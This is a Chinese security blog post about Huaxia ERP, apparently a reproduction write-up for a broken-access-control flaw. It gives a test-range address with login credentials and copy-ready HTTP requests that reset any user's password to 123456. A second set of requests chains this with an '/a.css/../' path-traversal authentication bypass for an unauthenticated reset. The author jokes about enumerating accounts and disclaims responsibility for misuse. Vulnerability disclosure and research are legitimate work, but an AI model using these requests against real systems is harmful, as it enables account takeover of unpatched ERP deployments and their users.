> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/n1cfEpQLGHw-tAVdZVMdvw)

又是这个测试靶场。。。

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="132" valign="top"><p>靶场地址</p></td><td width="421" colspan="2" valign="top"><p>http://47.116.69.14</p></td></tr><tr><td width="132" valign="top"><p>账户密码</p></td><td width="210" valign="top"><p><strong>jsh</strong></p></td><td width="210" valign="top"><p><strong>123456</strong></p></td></tr></tbody></table>

**1、描述**

  

华夏 ERP 基于 SpringBoot 框架和 SaaS 模式，可以算作是国内人气比较高的一款 ERP 项目，但经过源码审计发现其存在多个漏洞，本篇为越权任意用户密码重置漏洞，结合上一篇的授权绕过漏洞再打一个组合拳, 前台任意用户密码重置！

  

  

  

  

  

**2、影响范围**

  

华夏 ERP  

  

  

  

  

  

**3、漏洞复现**

  

从开源项目本地搭建来进行审计，源码下载地址：

百度网盘 https://pan.baidu.com/s/1jlild9uyGdQ7H2yaMx76zw  提取码: 814g  

  

  

  

  

  

一、越权任意密码重置漏洞  

漏洞简单描述：

```
src/main/java/com/jsh/erp/controller/UserController.java
```

```
POST /user/resetPwd HTTP/1.1
Host: 47.116.69.14
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36 Edg/89.0.774.45
X-Requested-With: XMLHttpRequest
Referer: http://47.116.69.14/pages/reports/account_report.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5
Cookie: JSESSIONID=D735ED1C9E200438866A79896DF1F77D;
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

id=63
```

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDialU5IZjbFcLn82gmFctiaRxia32e9vOX7b7Kr25SicPKxMWNIOZ1fn9PBicwa9yOicQGwbnv0Vwrc0HQ/640?wx_fmt=png)

测试漏洞的时候，我们先使用测试账号登录进后台，然后获取到所有用户 list

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDialU5IZjbFcLn82gmFctiaRzwD6ZZ1gtiaLLOiaHbPIXJKIWXRoRmcOfk8ZO3FBw9PPvyZQXUYtderA/640?wx_fmt=png)

发现主管大大的 ID 为 63，那我们就可以把他的密码重置掉：

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDialU5IZjbFcLn82gmFctiaRibcvlwoMpzvpzJiaDxtveJ1yKgmiaib9fBnrjZYPwFibic906sDicnJ2jiaia0Q/640?wx_fmt=png)

知道你们懒得敲，复制一下：

```
POST /a.css/../user/resetPwd HTTP/1.1
Host: 47.116.69.14
Content-Length: 8
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.60
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://47.116.69.14
Referer: http://47.116.69.14/pages/manage/user.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5
Connection: close

id=90824
```

从上面的源码中可以看到，重置后的默认密码为 123456

二、组合拳 - 前台任意用户密码重置漏洞

那么实战中怎么可能有测试账号给你登录后台呢，弱口令？爆破？只不过很少时候是 yyds，那么我们就可以结合上一篇中的授权绕过漏洞打个组合拳。  

我们从前台随便重置一个 ID 的密码：  

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDialU5IZjbFcLn82gmFctiaR5bV36N3iaXx47RTyKicKhL54VmOPd91sVLic4NcDbJVkkTNxUWVFE0M4w/640?wx_fmt=png)

```
POST /a.css/../user/resetPwd HTTP/1.1
Host: 47.116.69.14
Content-Length: 8
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.60
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://47.116.69.14
Referer: http://47.116.69.14/pages/manage/user.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5
Connection: close
id=90824
```

这时候肯定有人要问了，密码是给重置成 123456 了，那怎么知道账户是什么？？

(⊙o⊙)… 阿这，枚举一下子？然后全试一遍？哈哈哈不管了，反正不是我实战，就是这么不负责~

最后再给大家介绍一下漏洞库，地址：wiki.xypbk.com  

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDrnboUobzRQh0afompnvn1GjZWV69BXhbVdDPh2GNcQzoTyXn20iaOhsIGsxPPicJz6u7Rkq5weKmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDrnboUobzRQh0afompnvn1vUPmy8nUyUcxBicqJEtxo3ib4YzTQQEWd5cotecmuB0pZy4AKgAdhapg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDrnboUobzRQh0afompnvn1SjnVpDzicoVx6nMShk1Ou1jtKYYicsvNHt3DCWZnM5bvTnW56wcFwD9Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDrnboUobzRQh0afompnvn1Hxk0rhBSk7Oib2ZiafD0w9T9YBDffv171WjmnvFxlktv5UZiahYwytZ7w/640?wx_fmt=png)

本站暂不开源，因为想控制影响范围，若因某些人乱搞，造成了严重后果，本站将即刻关闭。

漏洞库内容来源于互联网 && 零组文库 &&peiqi 文库 && 自挖漏洞 && 乐于分享的师傅，供大家方便检索，绝无任何利益。  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。

若有愿意分享自挖漏洞的佬师傅请公众号后台留言，本站将把您供上，并在此署名，天天烧香那种！

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Yzhia63knJ4QJFvO4WBfd6KQazjtuPC7uqNBt5gE06ia7GjOVn2RFOicNA/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/TlgiajQKAFPtOYY6tXbF7PrWicaKzENbNF71FLc4vO5nrH2oxBYwErfAHKg2fD520niaCfYbRnPU6teczcpiaH5DKA/640?wx_fmt=png)

Qingy 之安全  

![](https://mmbiz.qpic.cn/mmbiz_png/Y8TRQVNlpCW6icC4vu5Pl5JWXPyWdYvGAyfVstVJJvibaT4gWn3Mc0yqMQtWpmzrxibqciazAr5Yuibwib5wILBINfuQ/640?wx_fmt=png)

公众号